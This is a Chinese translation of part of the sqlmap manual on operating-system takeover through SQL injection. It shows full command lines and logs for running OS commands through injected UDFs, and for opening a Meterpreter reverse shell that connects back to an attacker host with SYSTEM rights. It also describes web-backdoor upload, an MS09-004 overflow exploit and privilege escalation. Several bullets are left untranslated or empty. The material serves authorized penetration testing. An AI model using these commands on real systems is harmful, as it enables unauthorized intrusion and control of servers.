## 接管操作系统

### 运行任意操作系统命令

选项和开关：`--os-cmd` 和 `--os-shell`

当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server，并且当前会话用户拥有对数据库特定功能和相关架构特性的利用权限时，sqlmap 能够在**数据库所在服务器的操作系统上运行任意的命令**。

在 MySQL 和 PostgreSQL 中，sqlmap 可以上传（通过前面描述的文件上传功能）一个包含两个用户自定义函数——分别为 `sys_exec()` 和 `sys_eval()` 的共享库（二进制文件），然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。在 Microsoft SQL Server 中，sqlmap 会利用 `xp_cmdshell` 存储过程：如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；如果该存储过程不存在，sqlmap 则会重新创建它。

当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。相反，如果无需标准输出对应结果，sqlmap 则会使用堆查询注入技术执行相关的命令。

这些技术的相关详情可见白皮书[通过高级 SQL 注入，对操作系统进行完全控制](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)。

针对 PostgreSQL 目标的示例：

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
os-cmd id -v 1

[...]
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
[hh:mm:12] [INFO] testing if current user is DBA
[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
do you want to retrieve the command standard output? [Y/n/a] y
command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(post
gres)'

[hh:mm:19] [INFO] cleaning up the database management system
do you want to remove UDF 'sys_eval'? [Y/n] y
do you want to remove UDF 'sys_exec'? [Y/n] y
[hh:mm:23] [INFO] database management system cleanup finished
[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file sys
tem can only be deleted manually
```

sqlmap 还支持模拟 shell 输入，你可以输入任意命令以执行。对应的选项是 `--os-shell`，并且和 `--sql-shell` 一样，具备 TAB 补全和记录历史命令的功能。

如果堆查询没有被 Web 应用（例如：PHP 或 ASP 且后端 DBMS 为 MySQL）识别出来，并且 DBMS 为 MySQL，假如后端 DBMS 和 Web 服务器在同一台服务器上，则仍可以通过利用 `SELECT` 语句中的 `INTO OUTFILE`，在 Web 服务器根目录中的可写目录中创建 Web 后门，从而执行命令。sqlmap 支持上述功能并允许用户提供一个逗号分隔、用于指定根目录子目录的列表，从而尝试上传 Web 文件传输器和后续的 Web 后门。sqlmap 有以下几种语言的 Web 文件传输器和后门：

* ASP
* ASP.NET
* JSP
* PHP

###  带外状态连接：Meterpreter & friends

开关和选项：`--os-pwn`，`--os-smbrelay`，`--os-bof`，`--priv-esc`，`--msf-path` 和 `--tmp-path`

---

当后端数据库为 MySQL，PostgreSQL 或者 Microsoft SQL Server，并且当前会话用户拥有对数据库特定功能和相关架构特性利用的权限时，sqlmap 能够在攻击者机器与数据库所在的服务器之间建立起 ** 带外有状态的 TCP 连接**。根据用户的选择，该连接可以时交互式命令行形式、Meterpreter 会话、或者用户界面(VNC)会话。

sqlmap 依赖 Metasploit，用于创建相关的 shellcode，实现了在数据库服务器上执行的四种技术。相关技术详情如下：


* 通过 sqlmap 的用户自定义函数 `sys_bineval()` 在数据库 **内存中执行 Metasploit's shellcode*。 在 MySQL 和 PostgreSQL 中，通过开关 `--os-pwn`实现。
* 通过 MySQL 和 PostgreSQL 中的用户自定义函数`sys_exec()`，或者 Microsoft SQL Server 的`xp_cmdshell()`，上传并执行 Metasploit's **独立负载文件传输器**，通过开关`--os-pwn`实现。
* Upload and execution of a Metasploit's **stand-alone payload stager** via sqlmap own user-defined function `sys_exec()` on MySQL and PostgreSQL or via `xp_cmdshell()` on Microsoft SQL Server - switch `--os-pwn`.
* 
* Execution of Metasploit's shellcode by performing a **SMB reflection attack** ([MS08-068](http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx)) with a UNC path request from the database server to
the attacker's machine where the Metasploit `smb_relay` server exploit listens. Supported when running sqlmap with high privileges (`uid=0`) on Linux/Unix and the target DBMS runs as Administrator on Windows - switch `--os-smbrelay`.
* Database in-memory execution of the Metasploit's shellcode by exploiting **Microsoft SQL Server 2000 and 2005
`sp_replwritetovarbin` stored procedure heap-based buffer overflow** ([MS09-004](http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx)). sqlmap has its own exploit to trigger the
vulnerability with automatic DEP memory protection bypass, but it relies on Metasploit to generate the shellcode to get executed upon successful exploitation - switch `--os-bof`.

相关的技术详情可见白皮书[通过高级 SQL 注入，进行操作系统的完全控制](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857)和演讲幻灯片 [将控制由数据库层面拓展到操作系统层面](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database).

以 MySQL 为目标的一个例子:

```
$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\
id=1" --os-pwn --msf-path /software/metasploit

[...]
[hh:mm:31] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
back-end DBMS: MySQL 5.0
[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
> 
[hh:mm:32] [INFO] testing if current user is DBA
[hh:mm:32] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 
[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
how do you want to execute the Metasploit shellcode on the back-end database und
erlying operating system?
[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
[2] Stand-alone payload stager (file system way)
> 
[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on 
all ports 
between the specified and 65535
[3] Bind TCP: Listen on the database host for a connection
> 
which is the local address? [192.168.136.1] 
which local port number do you want to use? [60641] 
which payload do you want to use?
[1] Meterpreter (default)
[2] Shell
[3] VNC
> 
[hh:mm:40] [INFO] creation in progress ... done
[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, p
lease wait..

                                _
                                | |      o
_  _  _    _ _|_  __,   ,    _  | |  __    _|_
/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
                        /|
                        \|


    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
+ -- --=[ 674 exploits - 351 auxiliary
+ -- --=[ 217 payloads - 27 encoders - 8 nops
    =[ svn r12272 updated 4 days ago (2011.04.07)

PAYLOAD => windows/meterpreter/reverse_tcp
EXITFUNC => thread
LPORT => 60641
LHOST => 192.168.136.1
[*] Started reverse handler on 192.168.136.1:60641 
[*] Starting the payload handler...
[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_b
ineval', please wait..
[*] Sending stage (749056 bytes) to 192.168.136.129
[*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) a
t Mon Apr 11 hh:mm:52 +0100 2011

meterpreter > Loading extension espia...success.
meterpreter > Loading extension incognito...success.
meterpreter > [-] The 'priv' extension has already been loaded.
meterpreter > Loading extension sniffer...success.
meterpreter > System Language : en_US
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Computer        : W2K3R2
Architecture    : x86
Meterpreter     : x86/win32
meterpreter > Server username: NT AUTHORITY\SYSTEM
meterpreter > ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0



Intel(R) PRO/1000 MT Network Connection
Hardware MAC: 00:0c:29:fc:79:39
IP Address  : 192.168.136.129
Netmask     : 255.255.255.0


meterpreter > exit

[*] Meterpreter session 1 closed.  Reason: User exit
```

默认， 在 Windows 上 MySQL 以 `SYSTEM` 身份运行，然而 PostgreSQL 则在 Windows 和 Linux 上都是以低权限用户 `postgres` 运行。Microsoft SQL Server 2000 默认以 `SYSTEM` 身份运行，而对于 Microsoft SQL 2005 和 2008，则大部分以 `NETWORK SERVICE` 身份运行，有时候以 `LOCAL SERVICE` 身份运行。

同时，sqlmap 支持提供 `--priv-esc` 开关，用于数据库进程用户通过 Metasploit's `getsystem` 命令及相关的[kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) 技术 ([MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx))，进行提权操作。
